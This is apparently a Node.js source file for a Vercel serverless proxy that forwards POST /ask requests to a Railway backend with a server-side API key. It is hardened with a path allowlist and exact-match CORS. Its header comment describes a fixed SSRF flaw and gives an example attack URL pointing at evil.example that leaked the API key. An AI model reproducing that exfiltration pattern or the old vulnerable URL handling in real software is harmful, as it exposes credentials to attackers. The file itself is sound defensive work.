// Vercel serverless route: POST /api/ask
// Proxies to Railway ASK service, holding ASK_API_KEY server-side.
// War Room calls /api/ask instead of Railway directly — key never reaches client.
//
// Env vars (Vercel project settings, server-side only):
//   ASK_RAILWAY_URL  — Railway ASK base URL
//   ASK_API_KEY      — x-api-key header value for Railway ASK auth
//
// SC2-P0-SSRF-001 — this proxy used to build `new URL(req.query.path, RAILWAY_URL)`
// with an attacker-controlled path and no admission check. `new URL()` IGNORES its
// base when the first argument is itself an absolute or protocol-relative URL, so
// ?path=https://evil.example/steal sent ASK_API_KEY to an attacker-chosen host. CORS
// also reflected `Access-Control-Allow-Origin` from any Origin header, or fell back
// to '*' when Origin was absent.
//
// The fix is two independent gates, both deny-by-default:
//   _admitPath(path, method) — path must be a string, must start with a single '/',
//     must not be protocol-relative or contain a backslash, must resolve (via `new
//     URL`) to the Railway origin AND to a pathname on the hard-coded policy below,
//     and the request method must be the one the policy allows for that pathname.
//     Only /ask via POST is on the policy — the old GET ?path=/whatever passthrough
//     is removed; nothing in this codebase called it.
//   _applyCors(req, res) — reflects Access-Control-Allow-Origin ONLY for an exact
//     match against _ALLOWED_ORIGINS. An absent Origin, an unknown Origin, or a
//     same-origin-as-substring trap (suffix/prefix match) are all denied. Vary:
//     Origin is set on every path so caches never conflate allowed and denied
//     responses.
//
// Both gates log exactly one WARN line per drop (§41) and never include the
// attacker-supplied value in that line — see test/ask-guard.test.mjs and the
// adversarial acceptance probe scripts/probe-ask-guard.sh.

const https = require('https');
const { URL } = require('url');

const RAILWAY_URL = process.env.ASK_RAILWAY_URL || 'https://sasmaster-ask-production.up.railway.app';
const API_KEY     = process.env.ASK_API_KEY     || '';
const TIMEOUT_MS  = 29000; // Vercel function limit is 30s; leave 1s headroom

const ALLOWED_ORIGINS = Object.freeze(['https://sasmaster-status.vercel.app']);

// pathname -> allowed methods. Deny by default: anything not listed here is refused
// even if it resolves on-origin (e.g. /health, /api/v1/s3/presign are real Railway
// routes, but nothing calls them through this proxy).
const PATH_POLICY = Object.freeze({
  '/ask': ['POST'],
});

function warn(reason) {
  console.warn(`[ask-guard] dropped: ${reason}`);
}

function _admitPath(rawPath, method) {
  const path = rawPath === undefined ? '/ask' : rawPath;

  if (typeof path !== 'string') {
    warn('invalid_path');
    return { ok: false, status: 400, error: 'invalid_path' };
  }

  const qIdx = path.indexOf('?');
  const rawPathname = qIdx === -1 ? path : path.slice(0, qIdx);
  const rawSearch = qIdx === -1 ? '' : path.slice(qIdx);

  if (
    !rawPathname.startsWith('/') ||
    rawPathname.startsWith('//') ||
    rawPathname.includes('\\') ||
    rawPathname === '/'
  ) {
    warn('invalid_path');
    return { ok: false, status: 400, error: 'invalid_path' };
  }

  let url;
  try {
    url = new URL(rawPathname + rawSearch, RAILWAY_URL);
  } catch {
    warn('invalid_path');
    return { ok: false, status: 400, error: 'invalid_path' };
  }

  const railwayOrigin = new URL(RAILWAY_URL).origin;
  const allowedMethods = url.origin === railwayOrigin ? PATH_POLICY[url.pathname] : undefined;

  if (!allowedMethods) {
    warn('invalid_path');
    return { ok: false, status: 400, error: 'invalid_path' };
  }

  if (!allowedMethods.includes(method)) {
    warn('method_not_allowed');
    return { ok: false, status: 405, error: 'method_not_allowed' };
  }

  return { ok: true, pathname: url.pathname, search: url.search };
}

function _applyCors(req, res) {
  res.setHeader('Vary', 'Origin');

  const origin = req.headers && req.headers.origin;
  if (origin && ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    return true;
  }

  warn('origin');
  return false;
}

function upstream(path, method, body, headers) {
  return new Promise((resolve, reject) => {
    const target = new URL(path, RAILWAY_URL);
    const payload = body ? JSON.stringify(body) : null;
    const reqHeaders = {
      'Content-Type':  'application/json',
      'x-api-key':     API_KEY,
      'x-forwarded-by': 'vercel-ask-proxy',
      ...headers,
    };
    if (payload) reqHeaders['Content-Length'] = Buffer.byteLength(payload);

    const req = https.request(
      { hostname: target.hostname, path: target.pathname + target.search,
        method, headers: reqHeaders, timeout: TIMEOUT_MS },
      (r) => {
        let data = '';
        r.on('data', c => data += c);
        r.on('end', () => resolve({ status: r.statusCode, body: data, headers: r.headers }));
      }
    );
    req.on('timeout', () => { req.destroy(); reject(new Error('upstream timeout')); });
    req.on('error', reject);
    if (payload) req.write(payload);
    req.end();
  });
}

const handler = async (req, res) => {
  const corsOk = _applyCors(req, res);

  if (req.method === 'OPTIONS') { res.status(204).end(); return; }

  if (!corsOk) {
    res.status(403).json({ error: 'origin_not_allowed' });
    return;
  }

  if (!API_KEY) {
    return res.status(503).json({ error: 'ASK proxy not configured — ASK_API_KEY missing' });
  }

  const admission = _admitPath(req.query.path, req.method);
  if (!admission.ok) {
    res.status(admission.status).json({ error: admission.error });
    return;
  }

  try {
    let body = null;
    if (req.method === 'POST') {
      // Collect body (Vercel doesn't stream by default)
      body = await new Promise((resolve) => {
        let raw = '';
        req.on('data', c => raw += c);
        req.on('end', () => { try { resolve(JSON.parse(raw)); } catch { resolve(raw); } });
      });
    }

    const result = await upstream(admission.pathname + admission.search, req.method, body, {});

    // Pass through content-type from Railway
    const ct = result.headers['content-type'] || 'application/json';
    res.setHeader('Content-Type', ct);
    res.status(result.status).send(result.body);
  } catch (e) {
    console.error('[ask-proxy] upstream error:', e.message);
    res.status(502).json({ error: 'ASK upstream unavailable', detail: e.message });
  }
};

handler._admitPath = _admitPath;
handler._applyCors = _applyCors;
handler._ALLOWED_ORIGINS = ALLOWED_ORIGINS;

module.exports = handler;
